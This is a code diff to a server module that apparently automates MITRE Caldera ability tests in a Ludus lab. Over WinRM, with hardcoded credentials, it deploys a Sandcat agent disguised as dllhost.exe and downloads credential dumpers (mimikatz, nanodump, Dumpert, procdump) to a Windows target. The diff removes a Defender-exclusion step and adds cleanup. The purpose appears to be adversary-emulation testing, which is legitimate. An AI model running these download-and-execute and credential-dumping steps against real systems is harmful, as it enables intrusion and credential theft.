@@ -114,18 +114,6 @@ async function getCalderaAgents() {
 async function deploySandcatWindows(ip, group) {
   console.log(`[server] deploySandcatWindows(ip=${ip}, group=${group})`)
 
-  try {
-    const status = await winrmRun(ip, "localuser", "password",
-      'powershell -Command "if ((Get-MpComputerStatus).RealTimeProtectionEnabled) { Write-Host ENABLED } else { Write-Host DISABLED }"')
-    if (status.trim() === "ENABLED") {
-      await winrmRun(ip, "localuser", "password",
-        'powershell -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\Public\'"')
-      console.log("[server] Defender exclusion added for C:\\Users\\Public")
-    } else {
-      console.log("[server] Defender real-time protection is disabled, skipping exclusion")
-    }
-  } catch {}
-
   const dlCmd = `powershell -Command "$url='http://10.1.99.1:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`
   await winrmRun(ip, "localuser", "password", dlCmd)
 
@@ -201,15 +189,27 @@ async function deployAbilityPayload(ip, ability) {
   } catch { return destPath }
 
   const PAYLOAD_URLS = {
-    "procdump.exe": "https://download.sysinternals.com/files/Procdump.zip",
-    "procdump64.exe": "https://download.sysinternals.com/files/Procdump.zip",
+    "procdump.exe":          { url: "https://download.sysinternals.com/files/Procdump.zip",            zipEntry: "procdump64.exe" },
+    "procdump64.exe":        { url: "https://download.sysinternals.com/files/Procdump.zip",            zipEntry: "procdump64.exe" },
+    "Outflank-Dumpert.exe":  { url: "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" },
+    "nanodump.x64.exe":      { url: "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" },
+    "mimikatz.exe":          { url: "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip", zipEntry: "x64\\mimikatz.exe" },
   }
-  const url = PAYLOAD_URLS[filename]
-  if (!url) return null
+  const info = PAYLOAD_URLS[filename]
+  if (!info) return null
 
-  console.log(`[server] deployAbilityPayload: downloading ${filename} from ${url}`)
-  await winrmRun(ip, "localuser", "password",
-    `powershell -Command "Invoke-WebRequest -Uri '${url}' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\${filename}' '${destPath}' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force; Write-Host 'DEPLOYED'"`)
+  const { url, zipEntry } = info
+  console.log(`[server] deployAbilityPayload: deploying ${filename} from ${url}`)
+
+  if (zipEntry) {
+    const destDir = destPath.includes("\\") ? destPath.replace(/[^\\]+$/, "") : ""
+    const mkdirCmd = destDir ? `New-Item -ItemType Directory -Force -Path '${destDir}'; ` : ""
+    await winrmRun(ip, "localuser", "password",
+      `powershell -Command "${mkdirCmd}Invoke-WebRequest -Uri '${url}' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\${zipEntry}' '${destPath}' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force; Write-Host 'DEPLOYED'"`)
+  } else {
+    await winrmRun(ip, "localuser", "password",
+      `powershell -Command "Invoke-WebRequest -Uri '${url}' -OutFile '${destPath}'; Write-Host 'DEPLOYED'"`)
+  }
   console.log(`[server] deployAbilityPayload: ${filename} deployed to ${destPath}`)
 
   if (filename.includes("procdump")) {
@@ -230,11 +230,16 @@ async function exploitAbility(paw, ability, payloadPath) {
 
   const modified = structuredClone(original)
   const oldCmd = modified.executors[0].command
-  modified.executors[0].command = oldCmd.replace(
-    /"PathToAtomicsFolder[^"]*"/,
-    `"${payloadPath}"`
-  )
-  console.log(`[server] exploitAbility: command "${oldCmd.slice(0, 60)}..." → "${modified.executors[0].command.slice(0, 60)}..."`)
+
+  if (payloadPath !== null) {
+    modified.executors[0].command = oldCmd.replace(
+      /"?PathToAtomicsFolder[^"\s]*"?/,
+      `"${payloadPath}"`
+    )
+    console.log(`[server] exploitAbility: command "${oldCmd.slice(0, 60)}..." → "${modified.executors[0].command.slice(0, 60)}..."`)
+  } else {
+    console.log(`[server] exploitAbility: no PathToAtomicsFolder to replace, running command as-is`)
+  }
 
   await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)
 
@@ -251,9 +256,12 @@ async function exploitAbility(paw, ability, payloadPath) {
       const links = agent.links || []
       const mine = links.find(l => l.ability?.ability_id === abilityId)
       if (mine) {
-        const facts = mine.facts || []
-        console.log(`[server] exploitAbility: link id=${mine.id} status=${mine.status} facts=${facts.length}`)
-        return { facts, status: mine.status, linkId: mine.id }
+        console.log(`[server] exploitAbility: link id=${mine.id} status=${mine.status} finish=${mine.finish}`)
+        if (mine.finish != null) {
+          const facts = mine.facts || []
+          return { facts, status: mine.status, linkId: mine.id }
+        }
+        console.log(`[server] exploitAbility: link pending, waiting...`)
       }
       await new Promise(r => setTimeout(r, 2000))
     }
@@ -268,6 +276,7 @@ export async function testAbility(ludusUrl, apiKey, data, ws) {
   console.log(`[server] testAbility() entry — data:`, JSON.stringify(data.data))
   let group = null
   let winVm = null
+  let agentPaw = null
   let originalAbility = null
 
   try {
@@ -365,6 +374,7 @@ export async function testAbility(ludusUrl, apiKey, data, ws) {
 
     sendStatus(ws, "agentWait", "running", "Waiting for agent to check in to Caldera...")
     const agent = await waitForAgent(group)
+    agentPaw = agent.paw
     sendStatus(ws, "agentWait", "success", `Agent "${agent.paw}" checked in`)
 
     sendStatus(ws, "abilityLookup", "running", `Fetching ability "${name}"...`)
@@ -372,6 +382,7 @@ export async function testAbility(ludusUrl, apiKey, data, ws) {
     const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
     if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
     console.log(`[server] ability executors: platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
+    sendStatus(ws, "abilityLookup", "success", `Ability "${name}" found`)
 
     sendStatus(ws, "payloadDeploy", "running", "Deploying ability payload to Windows target...")
     const payloadPath = await deployAbilityPayload(winVm.vm.ip, ability)
@@ -382,25 +393,38 @@ export async function testAbility(ludusUrl, apiKey, data, ws) {
     }
 
     sendStatus(ws, "abilityExploit", "running", `Exploiting agent with ability "${name}"...`)
-    const result = await exploitAbility(agent.paw, ability, payloadPath || ability.executors[0].command)
+    const result = await exploitAbility(agent.paw, ability, payloadPath ?? null)
     const factsCount = result?.facts?.length || 0
     sendStatus(ws, "abilityExploit", "success", `Ability executed — ${factsCount} facts collected`)
 
-    sendStatus(ws, "cleanup", "running", "Cleaning up agent and scheduled task...")
+    sendStatus(ws, "cleanup", "running", "Cleaning up agent, process, and scheduled task...")
     try { await calderaRest("DELETE", { index: "agents", paw: agent.paw }) } catch {}
+    try {
+      await winrmRun(winVm.vm.ip, "localuser", "password",
+        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
+    } catch {}
     await winrmRun(winVm.vm.ip, "localuser", "password",
       `powershell -Command "Unregister-ScheduledTask -TaskName 'CalderaSandcat-${group}' -Confirm:\$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
-    sendStatus(ws, "cleanup", "success", "Cleaned up agent and scheduled task")
+    sendStatus(ws, "cleanup", "success", "Cleaned up agent, process, and scheduled task")
 
     sendStatus(ws, "complete", "success", `Ability "${name}" tested successfully — ${factsCount} facts`)
   } catch (err) {
     console.log(`[server] testAbility caught error: ${err.message}`)
-    sendStatus(ws, "complete", "error", err.message)
+    sendStatus(ws, "cleanup", "running", "Cleaning up on error...")
     try {
-      if (winVm?.vm?.ip && group) {
-        await winrmRun(winVm.vm.ip, "localuser", "password",
-          `powershell -Command "Unregister-ScheduledTask -TaskName 'CalderaSandcat-${group}' -Confirm:\$false -ErrorAction SilentlyContinue"`)
+      try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }) } catch {}
+      if (winVm?.vm?.ip) {
+        try {
+          await winrmRun(winVm.vm.ip, "localuser", "password",
+            'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
+        } catch {}
+        if (group) {
+          await winrmRun(winVm.vm.ip, "localuser", "password",
+            `powershell -Command "Unregister-ScheduledTask -TaskName 'CalderaSandcat-${group}' -Confirm:\$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
+        }
       }
+      sendStatus(ws, "cleanup", "success", "Cleaned up")
     } catch {}
+    sendStatus(ws, "complete", "error", err.message)
   }
 }
